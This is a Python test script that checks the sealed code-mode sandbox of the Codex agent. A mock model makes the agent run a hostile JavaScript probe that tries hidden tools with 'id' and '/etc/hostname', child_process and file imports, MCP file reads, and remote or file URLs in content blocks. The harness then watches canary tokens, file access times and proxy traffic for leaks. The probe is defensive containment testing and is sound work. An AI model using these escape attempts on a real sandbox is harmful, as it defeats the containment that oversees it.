"""Force a hostile code-mode script through the sealed Codex; fail on any new reach.

Usage: python3 dev/codex-sandbox-probe.py /path/to/codex
A scripted local endpoint plays the model: its first reply is an `exec` call
that lists the isolate's globals and tools, then tries Node globals, imports,
non-Daycare tools, the Daycare tool the turn hides, file reads through MCP
resources, file or remote image URLs, and MCP content blocks that name a file
or a remote URL. It runs once with the world turn's tool scope and once with
homecoming's. No credentials or model calls.

The check fails if the isolate gains a global outside GLOBALS, if the nested
tools differ from the tools the same turn exposes in direct mode, or if any
probe succeeds. A new global is not necessarily new reach, but someone must
look at it before Daycare trusts that Codex version.

`content` (Codex 0.169+) may accept a block that names a file or a URL, since
it only inlines the string; reach would be Codex resolving one. So each block
kind is sent naming /etc/hostname, a canary file, https://example.com/a.png
and a fetch-canary URL on the endpoint, and judged by what Codex does next,
not by whether the call throws:
- The canary file sits outside the workspace, holds a fresh random token and
  has its atime set to 1970. The turn fails if the token, raw or base64,
  appears in anything Codex sends the endpoint or prints, or if the atime
  moves (when a read on this filesystem moves it; checked first). It also
  fails if /etc/hostname's contents reach the exec output or the Daycare
  server.
- Codex reaches the mock model only through HTTP(S)_PROXY, which points at
  the endpoint, so a fetch of example.com would arrive there too, as a
  CONNECT. The turn fails if one does, or if anything requests the
  fetch-canary path. Codex's own traffic through the proxy (ab.chatgpt.com
  from 0.162.1 to 0.170.0) is listed as strays, not judged.
- The turn fails if the exec output hands the model an image, audio or file
  URL that is not a data: URL, which the provider could fetch, or if a valid
  control image does not come through as one, which would leave that blind.
"""
import base64
import http.server
import json
import os
from pathlib import Path
import re
import secrets
import subprocess
import sys
import tempfile
import threading

binary = str(Path(sys.argv[1]).resolve())
source = (Path(__file__).resolve().parent.parent / "src/agent/codex/launch.rs").read_text()


def array(name):
    body = source.split("pub const " + name + ":", 1)[1].split("];", 1)[0]
    return [raw or quoted for raw, quoted in re.findall(r'r#"(.*?)"#|"([^"]*)"', body)]


MODEL = re.search(r'pub const DEFAULT_CODEX_MODEL: &str = "([^"]+)";', source).group(1)
EXPOSURE = re.search(r'pub const MCP_EXPOSURE: &str = r#"(.*?)"#;', source).group(1)

# Standard ECMAScript globals plus the code-mode helpers, as Codex 0.162.1 and
# 0.163.0 install them. No console, WebAssembly, SharedArrayBuffer or Atomics.
GLOBALS = {
    "AggregateError", "Array", "ArrayBuffer", "AsyncDisposableStack", "BigInt", "BigInt64Array",
    "BigUint64Array", "Boolean", "DataView", "Date", "DisposableStack", "Error", "EvalError",
    "FinalizationRegistry", "Float16Array", "Float32Array", "Float64Array", "Function", "Infinity",
    "Int16Array", "Int32Array", "Int8Array", "Intl", "Iterator", "JSON", "Map", "Math", "NaN",
    "Number", "Object", "Promise", "Proxy", "RangeError", "ReferenceError", "Reflect", "RegExp",
    "Set", "String", "SuppressedError", "Symbol", "SyntaxError", "TypeError", "URIError",
    "Uint16Array", "Uint32Array", "Uint8Array", "Uint8ClampedArray", "WeakMap", "WeakRef",
    "WeakSet", "decodeURI", "decodeURIComponent", "encodeURI", "encodeURIComponent", "escape",
    "eval", "globalThis", "isFinite", "isNaN", "parseFloat", "parseInt", "undefined", "unescape",
    # Code mode's own helpers.
    "ALL_TOOLS", "as_settled", "audio", "clearTimeout", "exit", "generatedImage", "image", "load",
    "notify", "setTimeout", "store", "stream_settled", "text", "tools", "yield_control",
    # Codex 0.169.0 adds `content` (0.168.0 has no such global; content.js first ships at tag
    # rust-v0.169.0). codex-rs/code-mode-runtime/src/runtime/globals.rs installs it and
    # content.js beside it wraps it: it emits one MCP content block, or each block of an
    # iterable, as exec output via normalize_output_content (runtime/value.rs) and
    # FunctionCallOutputContentItem::from_mcp_content_block (codex-rs/protocol/src/models/
    # mcp_content.rs). Text stays text; image or audio data becomes an inline data: URL, a
    # non-data: string wrapped as data:<mime>;base64,<string>; resource and resource_link
    # blocks are only stringified as text; file references and encrypted text are refused. It
    # cannot read files, fetch, import or call tools. The content probes below hold it to that.
    "content",
}
RESOURCE_HELPERS = ["list_mcp_resource_templates", "list_mcp_resources", "read_mcp_resource"]
SERVER_TOOLS = ["daycare_probe", "daycare_memory_list", "daycare_memory_save"]
# Each turn's MCP scope, and the Daycare tools it exposes in direct mode.
TURNS = {
    "world": ('mcp_servers.daycare.disabled_tools=["daycare_memory_save"]',
              ["daycare_probe", "daycare_memory_list"]),
    "homecoming": ('mcp_servers.daycare.enabled_tools=["daycare_memory_list","daycare_memory_save"]',
                   ["daycare_memory_list", "daycare_memory_save"]),
}
FOREIGN = ["exec_command", "shell", "shell_command", "apply_patch", "read_file", "list_dir",
           "view_image", "write_stdin", "request_user_input_async", "send_user_message_async",
           "clock__curr_time", "web__run", "web_search", "spawn_agent", "tool_search",
           "update_plan", "image_gen"]
IMPORTS = ["fs", "node:child_process", "https://example.com/x.js", "file:///etc/hostname"]
# The mock model's host. It never resolves, so Codex can reach it only through the proxy.
MOCK_HOST = "daycare-mock.invalid"
FETCH_PATH = "/daycare-fetch-canary/a.png"
# Watched only if long enough to be unmistakable; the canary file covers the rest.
HOSTNAME = Path("/etc/hostname").read_text().strip() if Path("/etc/hostname").is_file() else ""
# A valid 1x1 PNG. It must reach the exec output as a data: URL, or the URL check is blind.
CONTROL_PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="


def content_blocks(canary, fetch):
    """Every content() block kind that carries a URI or data, naming each target."""
    targets = {"hostname": "file:///etc/hostname", "canary": canary.as_uri(),
               "remote": "https://example.com/a.png", "fetch canary": fetch}
    return [["image control", {"type": "image", "data": CONTROL_PNG, "mimeType": "image/png"}]] + [
        [f"{kind} {label}", block] for label, uri in targets.items() for kind, block in [
            ("image", {"type": "image", "data": uri, "mimeType": "image/png"}),
            ("audio", {"type": "audio", "data": uri, "mimeType": "audio/wav"}),
            ("resource_link", {"type": "resource_link", "uri": uri, "name": "probe"}),
            ("resource", {"type": "resource", "resource": {"uri": uri, "text": ""}}),
        ]]


def leaked(secret, haystack):
    """Whether secret is in haystack raw or base64-encoded, at any alignment, in either alphabet."""
    forms = {secret}
    for pad in range(3):
        encoded = base64.b64encode(b"\0" * pad + secret.encode()).decode()[4 if pad else 0:-4]
        forms |= {encoded, encoded.translate(str.maketrans("+/", "-_"))}
    haystack = haystack.replace("\\/", "/")
    return any(form in haystack for form in forms if len(form) >= 8)


def urls(value):
    """URL fields in exec output items, at any depth; text fields are not URLs."""
    if isinstance(value, dict):
        for key, item in value.items():
            if key in ("image_url", "audio_url", "file_url", "url") and isinstance(item, str):
                yield item
            else:
                yield from urls(item)
    elif isinstance(value, list):
        for item in value:
            yield from urls(item)


PROBE = r'''
const hidden = HIDDEN;
const r = {globals: Object.getOwnPropertyNames(globalThis).sort(),
           tools: Object.keys(tools).sort(),
           all_tools: ALL_TOOLS.map(t => t.name).sort(),
           reached: []};
for (const g of ["require", "process", "fetch", "Deno", "Bun", "XMLHttpRequest", "WebSocket", "console", "WebAssembly"])
  if (typeof globalThis[g] !== "undefined") r.reached.push("global " + g);
for (const name of FOREIGN.concat(hidden)) {
  try { await tools[name]({cmd: "id", command: ["id"], path: "/etc/hostname"}); r.reached.push("tool " + name); }
  catch (e) {}
}
for (const m of IMPORTS) {
  try { await import(m); r.reached.push("import " + m); } catch (e) {}
}
for (const server of ["daycare", "filesystem"]) {
  try { await tools.read_mcp_resource({server, uri: "file:///etc/hostname"}); r.reached.push("resource " + server); }
  catch (e) {}
}
for (const url of ["file:///etc/hostname", "https://example.com/a.png"]) {
  try { image(url); r.reached.push("image " + url); } catch (e) {}
}
// Emitting these is allowed; the harness checks that nothing was read or fetched.
r.content = typeof content === "function" ? {} : "absent";
if (typeof content === "function")
  for (const [label, block] of CONTENT) {
    try { const out = content(block); r.content[label] = out === undefined ? "emitted" : {returned: out}; }
    catch (e) { r.content[label] = "refused: " + e; }
  }
text("PROBE REPORT " + JSON.stringify(r));
'''


def sse(events):
    return "".join(f"event: {e['type']}\ndata: {json.dumps(e)}\n\n" for e in events).encode()


def run_turn(root, env, turn, atime):
    scope, exposed = TURNS[turn]
    hidden = [f"mcp__daycare__{t}" for t in SERVER_TOOLS if t not in exposed]
    token = "daycare-canary-" + secrets.token_hex(16)
    canary = root / "outside" / f"{turn}-canary.txt"
    canary.write_text(token)
    requests, tool_calls, strays, traffic = [], [], [], []

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def stray(self):
            # Neither the MCP server nor the mock model: a fetch, or Codex's own traffic.
            strays.append(f"{self.command} {self.path}")
            self.send_response(403)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def do_GET(self):
            traffic.append(f"{self.requestline}\n{self.headers}")
            self.stray()

        do_HEAD = do_PUT = do_PATCH = do_DELETE = do_OPTIONS = do_CONNECT = do_GET

        def do_POST(self):
            raw = self.rfile.read(int(self.headers["Content-Length"]))
            traffic.append(f"{self.requestline}\n{self.headers}\n{raw.decode('utf-8', 'replace')}")
            if self.path != "/mcp" and not self.path.startswith(f"http://{MOCK_HOST}/"):
                return self.stray()
            request = json.loads(raw)
            if self.path == "/mcp":
                if "id" not in request:
                    self.send_response(202)
                    self.end_headers()
                    return
                if request["method"] == "tools/call":
                    tool_calls.append(request["params"]["name"])
                result = {
                    "initialize": {"protocolVersion": "2024-11-05", "capabilities": {"tools": {}},
                                   "serverInfo": {"name": "daycare", "version": "test"}},
                    "tools/list": {"tools": [{"name": name, "description": "Local test tool",
                                             "inputSchema": {"type": "object", "properties": {}}}
                                            for name in SERVER_TOOLS]},
                    "tools/call": {"content": [{"type": "text", "text": "ok"}]},
                }.get(request["method"])
                body = ({"jsonrpc": "2.0", "id": request["id"], "result": result} if result is not None else
                        {"jsonrpc": "2.0", "id": request["id"],
                         "error": {"code": -32601, "message": "method not found"}})
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(body).encode())
                return
            requests.append(request)
            n = len(requests)
            item = ({"type": "custom_tool_call", "id": "ctc_1", "call_id": "call_probe", "name": "exec",
                     "input": script, "status": "completed"} if n == 1 else
                    {"type": "message", "id": "msg_2", "role": "assistant", "status": "completed",
                     "content": [{"type": "output_text", "text": "done", "annotations": []}]})
            usage = {"input_tokens": 1, "output_tokens": 1, "total_tokens": 2,
                     "input_tokens_details": {"cached_tokens": 0}, "output_tokens_details": {"reasoning_tokens": 0}}
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.end_headers()
            self.wfile.write(sse([{"type": "response.created", "response": {"id": f"resp_{n}"}},
                                  {"type": "response.output_item.done", "output_index": 0, "item": item},
                                  {"type": "response.completed", "response": {"id": f"resp_{n}", "usage": usage}}]))

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        port = server.server_port
        script = (PROBE.replace("HIDDEN", json.dumps(hidden)).replace("FOREIGN", json.dumps(FOREIGN))
                  .replace("IMPORTS", json.dumps(IMPORTS))
                  .replace("CONTENT", json.dumps(content_blocks(canary, f"http://127.0.0.1:{port}{FETCH_PATH}"))))
        proxy = f"http://127.0.0.1:{port}"
        turn_env = {**env, **{name: proxy for name in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY",
                                                        "http_proxy", "https_proxy", "all_proxy"]},
                    "NO_PROXY": "127.0.0.1", "no_proxy": "127.0.0.1"}
        settings = array("SEAL_SETTINGS") + [
            f'model="{MODEL}"', 'model_catalog_json=' + json.dumps(str(root / "models.json")),
            'developer_instructions="Daycare probe persona"', 'model_provider="mock"',
            'model_providers.mock.name="mock"', f'model_providers.mock.base_url="http://{MOCK_HOST}/v1"',
            'model_providers.mock.wire_api="responses"', 'model_providers.mock.requires_openai_auth=false',
            f'mcp_servers.daycare.url="http://127.0.0.1:{port}/mcp"', EXPOSURE,
            'mcp_servers.daycare.required=true', 'mcp_servers.daycare.default_tools_approval_mode="approve"', scope]
        args = [x for f in array("DISABLED_FEATURES") for x in ["--disable", f]]
        args += [x for f in array("ENABLED_FEATURES") for x in ["--enable", f]]
        args += [x for s in settings for x in ["-c", s]]
        os.utime(canary, (0, canary.stat().st_mtime))
        result = subprocess.run([binary, "exec", "--json", "--ignore-user-config", "--ignore-rules",
                                 "--skip-git-repo-check", *args, "probe"], cwd=root / "workspace", env=turn_env,
                                capture_output=True, text=True, timeout=90, stdin=subprocess.DEVNULL)
    finally:
        server.shutdown()
        server.server_close()
        thread.join()
    assert len(requests) >= 2, (f"{turn}: the probe script never ran (Codex must reach the mock model through "
                                f"HTTP(S)_PROXY; strays {strays}): {result.stdout[-1500:]} {result.stderr[-1500:]}")
    outputs = [item["output"] for item in requests[1]["input"] if item.get("type") == "custom_tool_call_output"]
    assert outputs, f"{turn}: Codex returned no exec output"
    output = outputs[0] if isinstance(outputs[0], str) else "\n".join(x.get("text", "") for x in outputs[0])
    assert "PROBE REPORT " in output, f"{turn}: no probe report in the exec output: {output[-1500:]}"
    report = json.JSONDecoder().raw_decode(output, output.index("PROBE REPORT ") + len("PROBE REPORT "))[0]
    nested = sorted(RESOURCE_HELPERS + [f"mcp__daycare__{t}" for t in exposed])
    failures = []
    if set(report["globals"]) - GLOBALS:
        failures.append(f"new isolate globals: {sorted(set(report['globals']) - GLOBALS)}")
    if report["tools"] != nested:
        failures.append(f"nested tools {report['tools']} != direct-mode tools {nested}")
    if report["all_tools"] != nested:
        failures.append(f"ALL_TOOLS {report['all_tools']} != direct-mode tools {nested}")
    if report["reached"]:
        failures.append(f"probes succeeded: {report['reached']}")
    if set(tool_calls) - set(exposed):
        failures.append(f"Daycare server received hidden tool calls: {tool_calls}")
    if atime and canary.stat().st_atime != 0:
        failures.append("Codex read the canary file (its atime moved)")
    if leaked(token, "\n".join(traffic) + result.stdout + result.stderr):
        failures.append("the canary file's token reached Codex's traffic or output")
    # Not the whole request: a future Codex could name the host in its own context.
    mcp = "\n".join(t for t in traffic if t.startswith("POST /mcp "))
    if len(HOSTNAME) >= 8 and leaked(HOSTNAME, json.dumps(outputs) + mcp):
        failures.append("/etc/hostname's contents reached the exec output or the Daycare server")
    fetched = [s for s in strays if "example.com" in s or FETCH_PATH in s]
    if fetched:
        failures.append(f"content URLs were fetched: {fetched}")
    found = list(urls(outputs))
    remote = [u for u in found if u[:5].lower() != "data:"]
    if remote:
        failures.append(f"exec output hands the model URLs to fetch: {remote}")
    if report["content"] != "absent" and len(remote) == len(found):
        failures.append(f"the control image is not in the exec output as a data: URL, so the URL check is blind: {found}")
    return {"turn": turn, "nested_tools": report["tools"], "globals_checked": len(report["globals"]),
            "reached": report["reached"], "content": report["content"], "strays": strays,
            "model_requests_via_proxy": len(requests), "failures": failures}


with tempfile.TemporaryDirectory(prefix="daycare-sandbox-probe-") as scratch:
    root = Path(scratch)
    for name in ["home", "codex", "workspace", "outside"]:
        (root / name).mkdir()
    env = {"PATH": os.environ["PATH"], "HOME": str(root / "home"), "CODEX_HOME": str(root / "codex")}
    version = subprocess.check_output([binary, "--version"], env=env, text=True).strip()
    catalog = json.loads(subprocess.check_output([binary, "debug", "models", "--bundled"], env=env, text=True))
    entry = next((m for m in catalog["models"] if m["slug"] == MODEL), None)
    assert entry, f"{version}: the bundled catalog no longer contains the default model {MODEL}"
    modes = re.findall(r'"([a-z_]+)"', open(Path(__file__).resolve().parent.parent
                                            / "src/agent/codex/catalog.rs").read().split("const TOOL_MODES", 1)[1].split("= [", 1)[1].split("]", 1)[0])
    assert entry.get("tool_mode") in [None, *modes], f"{version}: {MODEL} has tool_mode {entry.get('tool_mode')!r}, which the runner refuses"
    # The runner's private catalog: patch and metadata tools cleared.
    entry = {**entry, "apply_patch_tool_type": None, "experimental_supported_tools": []}
    (root / "models.json").write_text(json.dumps({"models": [entry]}))
    # The token matcher finds a base64 copy at any offset, and not a fragment.
    assert all(leaked("daycare-canary-check", base64.b64encode(pad + b"daycare-canary-check").decode())
               for pad in [b"", b"a", b"ab"]) and not leaked("daycare-canary-check", "daycare-canary")
    # The atime check runs only where an atime can be set to 1970 and a read then moves it.
    control = root / "outside" / "control.txt"
    control.write_text("control")
    os.utime(control, (0, control.stat().st_mtime))
    atime = control.stat().st_atime == 0
    control.read_text()
    atime = atime and control.stat().st_atime != 0
    results = [run_turn(root, env, turn, atime) for turn in TURNS]
    print(json.dumps({"version": version, "model": MODEL, "tool_mode": entry.get("tool_mode"),
                      "atime_watched": atime, "hostname_watched": len(HOSTNAME) >= 8,
                      "turns": results}, indent=2))
    failed = [f"{r['turn']}: {f}" for r in results for f in r["failures"]]
    if failed:
        sys.exit("SANDBOX PROBE FAILED\n" + "\n".join(failed))
